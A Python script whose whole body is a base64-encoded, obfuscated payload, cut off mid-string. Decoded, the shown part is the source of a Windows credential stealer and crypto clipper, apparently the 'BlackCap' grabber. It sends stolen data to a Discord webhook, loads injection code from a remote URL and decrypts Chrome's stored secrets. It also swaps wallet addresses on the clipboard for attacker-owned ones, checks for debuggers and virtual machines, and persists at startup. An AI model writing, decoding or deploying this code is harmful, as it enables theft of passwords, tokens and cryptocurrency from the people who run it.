# Python code obfuscated by Peppy
 

import base64, codecs
magic = 'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGpzb24KaW1wb3J0IG50cGF0aAppbXBvcnQgb3MKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmUKaW1wb3J0IHNodXRpbAppbXBvcnQgc3FsaXRlMwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB3aW5yZWcKaW1wb3J0IHppcGZpbGUKaW1wb3J0IGh0dHB4CmltcG9ydCBwc3V0aWwKaW1wb3J0IGJhc2U2NAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGN0eXBlcwppbXBvcnQgdGltZQppbXBvcnQgcHlwZXJjbGlwCmltcG9ydCB3aW4zMmd1aQppbXBvcnQgd2luMzJjb24KZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0CmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3Blbgpmcm9tIHNodXRpbCBpbXBvcnQgY29weTIKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUsIHRpbWVkZWx0YSwgdGltZXpvbmUKZnJvbSBzeXMgaW1wb3J0IGFyZ3YKZnJvbSB0ZW1wZmlsZSBpbXBvcnQgZ2V0dGVtcGRpciwgbWtkdGVtcApmcm9tIGpzb24gaW1wb3J0IGxvYWRzLCBkdW1wcwpmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiCmZyb20gd2luMzJjcnlwdCBpbXBvcnQgQ3J5cHRVbnByb3RlY3REYXRhCgoKbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKClBhc3N3ID0gW107CgojIGAKIyAgICAieW91cndlYmhvb2t1cmwiID0geW91ciBkaXNjb3JkIHdlYmhvb2sgdXJsCiMgICAgImJsYWNrY2FwX2luamVjdF91cmwiID0gbXkgamF2YXNjcmlwdCBpbmplY3Rpb24gKGkgcmVjb21tYW5kIHRvIG5vdCBjaGFuZ2UpCiMgICAgImhpZGUiID0geW91IHdhbnQgdG8gaGlkZSBncmFiYmVyPyAoJ3llcycgb3IgJ25vJykKIyAgICAiZGJ1Z2tpbGxlciIgPSByZWNvbW1hbmQgdG8gbGV0IHRoaXMKIyAgICAiYmxwcmdnZyIgPSBkb24ndCB0b3VjaCBhdCB0aGlzCiMKIyBgCgoKCl9fY29uZmlnX18gPSB7CiAgICAneW91cndlYmhvb2t1cmwnOiAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA4ODA2NjgwOTUxODg5OTI2MS9ENXNCbVNycllKZnBfdy0takhHbDdXbVRJS3h1dmVScTBNTkw5WVNtX0dDajRVQkIwOHpGYXBNcjZwdE8xNl9iQUZqWSIsCiAgICAnYmxhY2tjYXBfaW5qZWN0X3VybCc6ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vS1NDSGRzYy9CbGFja0NhcC1JbmplY3QvbWFpbi9pbmRleC5qcyIsCiAgICAnaGlkZSc6IFRydWUsCiAgICAncGluZyc6IFRydWUsCiAgICAncGluZ3R5cGUnOiAiZXZlcnlvbmUiLAogICAgJ2Zha2VfZXJyb3InOiBGYWxzZSwKICAgICdzdGFydHVwJzogVHJ1ZSwKICAgICdraWxsX2Rpc2NvcmRfcHJvY2Vzcyc6IFRydWUsCiAgICAnZGJ1Z2tpbGxlcic6IFRydWUsCiAgICAKICAgICdhZGRyZXNzZV9jcnlwdG9fcmVwbGFjZXInOiBUcnVlLAogICAgJ2FkZHJlc3NlX2J0Yyc6ICdiYzFxZmF0dzM0NWhqMDl1YTBhOXd5MzI0dGp4ZWc0Y3k1dHdyZW1tNXUnLAogICAgJ2FkZHJlc3NlX2V0aCc6ICcweEZEMDM1RmFBQjhBMGMxRjNlQzMxM0Q1ZTlCMDhDNjdEMTg1QTMzODInLAogICAgJ2FkZHJlc3NlX3hjaGFpbic6ICcweEZEMDM1RmFBQjhBMGMxRjNlQzMxM0Q1ZTlCMDhDNjdEMTg1QTMzODInLAogICAgJ2FkZHJlc3NlX3BjaGFpbic6ICcweEZEMDM1RmFBQjhBMGMxRjNlQzMxM0Q1ZTlCMDhDNjdEMTg1QTMzODInLAogICAgJ2FkZHJlc3NlX2NjaGFpbic6ICcweEZEMDM1RmFBQjhBMGMxRjNlQzMxM0Q1ZTlCMDhDNjdEMTg1QTMzODInLAogICAgJ2FkZHJlc3NlX21vbmVybyc6ICc0MWRGcE16NzhYU2pvcmpWdkNyMVVBWkN4THRaQ3BGYjNhREFUeHNiTVI5SFFRNER1ZzlYUmdxQUdyaTk1VjZBcnhKUnJ3c2VuNUZqVlFtblpCRzlRU3FuUGFyOVgyRScsCiAgICAnYWRkcmVzc2VfYWRhJzogJ2FkZHIxcThwcTZldHhzeTd5c2tld3Y2MmZ1dGMwM3lweHR6Y2ZweW1jbXh3YWQ2OHllbXd6cDRqa2RxZnVmcGRqdWU1NW5jaHNsemd6dms5c2p6Zmgza3ZhNm01d2Zua3NrZm02NXknLAogICAgJ2FkZHJlc3NlX2Rhc2gnOiAnYWRkcjFxOHBxNmV0eHN5N3lza2V3djYyZnV0YzAzeXB4dHpjZnB5bWNteHdhZDY4eWVtd3pwNGprZHFmdWZwZGp1ZTU1bmNoc2x6Z3p2azlzanpmaDNrdmE2bTV3Zm5rc2tmbTY1eScsCiAgICAnYmxwcmdnZyc6CiAgICBbCiAgICAgICAgImh0dHBkZWJ1Z2dlcnVpIiwKICAgICAgICAid2lyZXNoYXJrIiwKICAgICAgICAiZmlkZGxlciIsCiAgICAgICAgInJlZ2VkaXQiLAogICAgICAgICJjbWQiLAogICAgICAgICJ0YXNrbWdyIiwKICAgICAgICAidmJveHNlcnZpY2UiLAogICAgICAgICJkZjVzZXJ2IiwKICAgICAgICAicHJvY2Vzc2hhY2tlciIsCiAgICAgICAgInZib3h0cmF5IiwKICAgICAgICAidm10b29sc2QiLAogICAgICAgICJ2bXdhcmV0cmF5IiwKICAgICAgICAiaWRhNjQiLAogICAgICAgICJvbGx5ZGJnIiwKICAgICAgICAicGVzdHVkaW8iLAogICAgICAgICJ2bXdhcmV1c2VyIiwKICAgICAgICAidmdhdXRoc2VydmljZSIsCiAgICAgICAgInZtYWN0aGxwIiwKICAgICAgICAieDk2ZGJnIiwKICAgICAgICAidm1zcnZjIiwKICAgICAgICAieDMyZGJnIiwKICAgICAgICAidm11c3J2YyIsCiAgICAgICAgInBybF9jYyIsCiAgICAgICAgInBybF90b29scyIsCiAgICAgICAgInhlbnNlcnZpY2UiLAogICAgICAgICJxZW11LWdhIiwKICAgICAgICAiam9lYm94Y29udHJvbCIsCiAgICAgICAgImtzZHVtcGVyY2xpZW50IiwKICAgICAgICAia3NkdW1wZXIiLAogICAgICAgICJqb2Vib3hzZXJ2ZXIiCiAgICBdCgp9CgoKCgppbmZvY29tID0gb3MuZ2V0bG9naW4oKQp2Y3RtX3BjID0gb3MuZ2V0ZW52KCJDT01QVVRFUk5BTUUiKQpyNG0gPSBzdHIocHN1dGlsLnZpcnR1YWxfbWVtb3J5KClbMF0gLyAxMDI0ICoqIDMpLnNwbGl0KCIuIilbMF0KZDFzayA9IHN0cihwc3V0aWwuZGlza191c2FnZSgnLycpWzBdIC8gMTAyNCAqKiAzKS5zcGxpdCgiLiIpWzBdCgpCbGFja0NhcF9SZWdleCA9ICdodHRwczovL3Bhc3RlLmJpbmduZXIuY29tL3Bhc3RlL2ZodnlwL3JhdycKcmVnX3JlcSA9IHJlcXVlc3RzLmdldChCbGFja0NhcF9SZWdleCkgCmNsZWFyX3JlZyA9IHIiW1x3LV17MjR9XC4iICsgcmVnX3JlcS50ZXh0CgoKCgpjbGFzcyBGdW5jdGlvbnMob2JqZWN0KToKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZ3RtazN5KHBhdGg6IHN0ciBvciBvcy5QYXRoTGlrZSk6CiAgICAgICAgaWYgbm90IG50cGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgYyA9IGYucmVhZCgpCiAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGMpCgogICAgICAgIHRyeToKICAgICAgICAgICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQogICAgICAgICAgICByZXR1cm4gRnVuY3Rpb25zLncxbmQwX2RjcihtYXN0ZXJfa2V5WzU6XSkKICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgIHJldHVybiBOb25lCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGNudmVydHRpbSh0aW1lOiBpbnQgb3IgZmxvYXQpIC0+IHN0cjoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGVwb2NoID0gZGF0ZXRpbWUoMTYwMSwgMSwgMSwgdHppbmZvPXRpbWV6b25lLnV0YykKICAgICAgICAgICAgY29kZXN0YW1wID0gZXBvY2ggKyB0aW1lZGVsdGEobWljcm9zZWNvbmRzPXRpbWUpCiAgICAgICAgICAgIHJldHVybiBjb2Rlc3RhbXAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIHcxbmQwX2RjcihlbmNyeXB0ZWRfc3RyOiBieXRlcykgLT4gc3RyOgogICAgICAgIHJldHVybiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX3N0ciwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0KCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgY3IzNHQzX2YxbGtlcyhfZGlyOiBzdHIgb3Igb3MuUGF0aExpa2UgPSBnZXR0ZW1wZGlyKCkpOgogICAgICAgIGYxbGVub20gPSAnJy5qb2luKHJhbmRvbS5TeXN0ZW1SYW5kb20oKS5jaG9pY2UoJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5JykgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMTAsIDIwKSkpCiAgICAgICAgcGF0aCA9IG50cGF0aC5qb2luKF9kaXIsIGYxbGVub20pCiAgICAgICAgb3BlbihwYXRoLCAieCIpCiAgICAgICAgcmV0dXJuIHBhdGgKCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZGNycHRfdmFsKGJ1ZmYsIG1hc3Rlcl9rZXkpIC0+IHN0cjoKICAgICAgICB0cnk6CiAgICAgICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpCiAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldHVybiBmJ0ZhaWxlZCB0byBkZWNyeXB0ICJ7c3RyKGJ1ZmYpfSIgfCBrZXk6ICJ7c3RyKG1hc3Rlcl9rZXkpfSInCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGczdF9IKHRva2VuOiBzdHIgPSBOb25lKToKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgIH0KICAgICAgICBpZiB0b2tlbjoKICAgICAgICAgICAgaGVhZGVycy51cGRhdGUoeyJBdXRob3JpemF0aW9uIjogdG9rZW59KQogICAgICAgIHJldHVybiBoZWFkZXJzCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIHN5c18xZm8oKSAtPiBsaXN0OgogICAgICAgIGZsYWcgPSAweDA4MDAwMDAwCiAgICAgICAgc2gxID0gIndtaWMgY3Nwcm9kdWN0IGdldCB1dWlkIgogICAgICAgIHNoMiA9ICJwb3dlcnNoZWxsIEdldC1JdGVtUHJvcGVydHlWYWx1ZSAtUGF0aCAnSEtMTTpTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxTb2Z0d2FyZVByb3RlY3Rpb25QbGF0Zm9ybScgLU5hbWUgQmFja3VwUHJvZHVjdEtleURlZmF1bHQiCiAgICAgICAgc2gzID0gInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoICdIS0xNOlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uJyAtTmFtZSBQcm9kdWN0TmFtZSIKICAgICAgICB0cnk6CiAgICAgICAgICAgIHV1aWR3bmR6ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoc2gxLCBjcmVhdGlvbmZsYWdzPWZsYWcpLmRlY29kZSgpLnNwbGl0KCdcbicpWzFdLnN0cmlwKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICB1dWlkd25keiA9ICJOL0EiCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3MW5rMzN5ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoc2gyLCBjcmVhdGlvbmZsYWdzPWZsYWcpLmRlY29kZSgpLnJzdHJpcCgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgdzFuazMzeSA9ICJOL0EiCiAgICAgICAgdHJ5OgogICAgICAgICAgICB3MW52M3IgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dChzaDMsIGNyZWF0aW9uZmxhZ3M9ZmxhZykuZGVjb2RlKCkucnN0cmlwKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICB3MW52M3IgPSAiTi9BIgogICAgICAgIHJldHVybiBbdXVpZHduZHosIHcxbnYzciwgdzFuazMzeV0KCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIG5ldF8xZm8oKSAtPiBsaXN0OgogICAgICAgIGlwLCBjaXR5LCBjb3VudHJ5LCByZWdpb24sIG9yZywgbG9jLCBnb29nbGVtYXAgPSAiTm9uZSIsICJOb25lIiwgIk5vbmUiLCAiTm9uZSIsICJOb25lIiwgIk5vbmUiLCAiTm9uZSIKICAgICAgICByZXEgPSBodHRweC5nZXQoImh0dHBzOi8vaXBpbmZvLmlvL2pzb24iKQogICAgICAgIGlmIHJlcS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIGRhdGEgPSByZXEuanNvbigpCiAgICAgICAgICAgIGlwID0gZGF0YS5nZXQoJ2lwJykKICAgICAgICAgICAgY2l0eSA9IGRhdGEuZ2V0KCdjaXR5JykKICAgICAgICAgICAgY291bnRyeSA9IGRhdGEuZ2V0KCdjb3VudHJ5JykKICAgICAgICAgICAgcmVnaW9uID0gZGF0YS5nZXQoJ3JlZ2lvbicpCiAgICAgICAgICAgIG9yZyA9IGRhdGEuZ2V0KCdvcmcnKQogICAgICAgICAgICBsb2MgPSBkYXRhLmdldCgnbG9jJykKICAgICAgICAgICAgZ29vZ2xlbWFwID0gImh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vbWFwcy9zZWFyY2gvZ29vZ2xlK21hcCsrIiArIGxvYwogICAgICAgIHJldHVybiBbaXAsIGNpdHksIGNvdW50cnksIHJlZ2lvbiwgb3JnLCBsb2MsIGdvb2dsZW1hcF0KCiAgICBAc3RhdGljbWV0aG9kCiAgICBkZWYgZmV0Y2hfY29uZihlOiBzdHIpIC0+IHN0ciBvciBib29sIHwgTm9uZToKICAgICAgICByZXR1cm4gX19jb25maWdfXy5nZXQoZSkKCgoKCgoKCgoKCmNsYXNzIGF1dG9fY29weV93YWxsZXQoRnVuY3Rpb25zKToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmFkZHJlc3Nfc3QzYWxlciA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfY3J5cHRvX3JlcGxhY2VyIikKICAgICAgICBzZWxmLmFkZHJlc3NfYnRjID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9idGMiKQogICAgICAgIHNlbGYuYWRkcmVzc19ldGggPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2V0aCIpCiAgICAgICAgc2VsZi5hZGRyZXNzX3hjaGFpbiA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfeGNoYWluIikKICAgICAgICBzZWxmLmFkZHJlc3NfcGNoYWluID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9wY2hhaW4iKQogICAgICAgIHNlbGYuYWRkcmVzc19jY2hhaW4gPSBzZWxmLmZldGNoX2NvbmYoImFkZHJlc3NlX2NjaGFpbiIpCiAgICAgICAgc2VsZi5hZGRyZXNzX21vbmVybyA9IHNlbGYuZmV0Y2hfY29uZigiYWRkcmVzc2VfbW9uZXJvIikKICAgICAgICBzZWxmLmFkZHJlc3NfYWRhID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9hZGEiKQogICAgICAgIHNlbGYuYWRkcmVzc19kYXNoID0gc2VsZi5mZXRjaF9jb25mKCJhZGRyZXNzZV9kYXNoIikKCgogICAgZGVmIGFkZHJlc3Nfc3dhcChzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGNsaXBib2FyZF9kYXRhID0gcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCdeWzEzXVthLWttLXpBLUhKLU5QLVoxLTldezI1LDM0fSQnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfYnRjICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX2J0YykKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnXjB4W2EtZkEtRjAtOV17NDB9JCcsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19ldGgpCiAgICAgICAgICAgICAgICBweXBlcmNsaXAucGFzdGUoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnXihbWF18W2Eta20tekEtSEotTlAtWjEtOV17MzYsNzJ9KS1bYS16QS1aXXsxLDgzfTFbcXB6cnk5eDhnZjJ0dmR3MHMzam41NGtoY2U2bXVhN2xdezM4fSQnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfeGNoYWluICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX3hjaGFpbikKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnXihbUF18W2Eta20tekEtSEotTlAtWjEtOV17MzYsNzJ9KS1bYS16QS1aXXsxLDgzfTFbcXB6cnk5eDhnZjJ0dmR3MHMzam41NGtoY2U2bXVhN2xdezM4fSQnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfcGNoYWluICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX3BjaGFpbikKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnXihbQ118W2Eta20tekEtSEotTlAtWjEtOV17MzYsNzJ9KS1bYS16QS1aXXsxLDgzfTFbcXB6cnk5eDhnZjJ0dmR3MHMzam41NGtoY2U2bXVhN2xdezM4fSQnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfY2NoYWluICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX2NjaGFpbikKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgnYWRkcjFbYS16MC05XSsnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICAgICAgaWYgY2xpcGJvYXJkX2RhdGEgbm90IGluIFtzZWxmLmFkZHJlc3NfYnRjLCBzZWxmLmFkZHJlc3NfZXRoLCBzZWxmLmFkZHJlc3NfeGNoYWluLCBzZWxmLmFkZHJlc3NfcGNoYWluLCBzZWxmLmFkZHJlc3NfY2NoYWluLCBzZWxmLmFkZHJlc3NfbW9uZXJvLCBzZWxmLmFkZHJlc3NfYWRhLCBzZWxmLmFkZHJlc3NfZGFzaF06CiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5jb3B5KHNlbGYuYWRkcmVzc19hZGEpCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCcvWFsxLTlBLUhKLU5QLVphLWttLXpdezMzfSQvZycsIGNsaXBib2FyZF9kYXRhKToKICAgICAgICAgICAgICAgIGlmIHNlbGYuYWRkcmVzc19kYXNoICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX2Rhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgIHB5cGVyY2xpcC5wYXN0ZSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmUuc2VhcmNoKCcvNFswLTlBQl1bMS05QS1ISi1OUC1aYS1rbS16XXs5M30kL2cnLCBjbGlwYm9hcmRfZGF0YSk6CiAgICAgICAgICAgICAgICBpZiBzZWxmLmFkZHJlc3NfbW9uZXJvICE9ICJub25lIjoKICAgICAgICAgICAgICAgICAgICBpZiBjbGlwYm9hcmRfZGF0YSBub3QgaW4gW3NlbGYuYWRkcmVzc19idGMsIHNlbGYuYWRkcmVzc19ldGgsIHNlbGYuYWRkcmVzc194Y2hhaW4sIHNlbGYuYWRkcmVzc19wY2hhaW4sIHNlbGYuYWRkcmVzc19jY2hhaW4sIHNlbGYuYWRkcmVzc19tb25lcm8sIHNlbGYuYWRkcmVzc19hZGEsIHNlbGYuYWRkcmVzc19kYXNoXToKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLmNvcHkoc2VsZi5hZGRyZXNzX21vbmVybykKICAgICAgICAgICAgICAgICAgICAgICAgcHlwZXJjbGlwLnBhc3RlKCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBkYXRhID0gTm9uZQogICAgICAgICAgICAKICAgICAgICAgICAgCiAgICBkZWYgbG9vcF90aHJvdWdoKHNlbGYpOgogICAgICAgIAogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHNlbGYuYWRkcmVzc19zd2FwKCkKICAgICAKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgaWYgc2VsZi5hZGRyZXNzX3N0M2FsZXIgPT0gInllcyI6CiAgICAgICAgICAgIHNlbGYubG9vcF90aHJvdWdoKCkKCgpjbGFzcyBiY19pbml0aWFsX2Z1bmMoRnVuY3Rpb25zKToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICAKICAgICAgICBzZWxmLmRzY2FwMSA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUiCgogICAgICAgIHNlbGYuZGlzY29yZF93ZWJob29rID0gc2VsZi5mZXRjaF9jb25mKCd5b3Vyd2ViaG9va3VybCcpCgogICAgICAgIHNlbGYuaGlkZSA9IHNlbGYuZmV0Y2hfY29uZigiaGlkZSIpCgogICAgICAgIHNlbGYucGluZ3R5cGUgPSBzZWxmLmZldGNoX2NvbmYoInBpbmd0eXBlIikKCiAgICAgICAgc2VsZi5waW5nb25ydW4gPSBzZWxmLmZldGNoX2NvbmYoInBpbmciKQogICAgICAgIAogICAgICAgIHNlbGYuYmFzZXVybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUiCgogICAgICAgIHNlbGYuc3RhcnR1cGV4ZSA9IHNlbGYuZmV0Y2hfY29uZigic3RhcnR1cCIpCiAgICAgICAgCiAgICAgICAgc2VsZi5mYWtlX2Vycm9yID0gc2VsZi5mZXRjaF9jb25mKCJmYWtlX2Vycm9yIikKCiAgICAgICAgc2VsZi5hcHBkYXRhID0gb3MuZ2V0ZW52KCJsb2NhbGFwcGRhdGEiKQoKICAgICAgICBzZWxmLnJvYW1pbmcgPSBvcy5nZXRlbnYoImFwcGRhdGEiKQogICAgICAgIAogICAgICAgIHNlbGYuY2hybW11c2VyZHR0ID0gbnRwYXRoLmpvaW4oc2VsZi5hcHBkYXRhLCAnR29vZ2xlJywgJ0Nocm9tZScsICdVc2VyIERhdGEnKQoKICAgICAgICBzZWxmLmRpciwgc2VsZi50ZW1wID0gbWtkdGVtcCgpLCBnZXR0ZW1wZGlyKCkKCiAgICAgICAgaW5mLCBuZXQgPSBzZWxmLnN5c18xZm8oKSwgc2VsZi5uZXRfMWZvKCkKCiAgICAgICAgc2VsZi51dWlkd25keiwgc2VsZi53MW52M3IsIHNlbGYudzFuazMzeSA9IGluZlswXSwgaW5mWzFdLCBpbmZbMl0KCiAgICAgI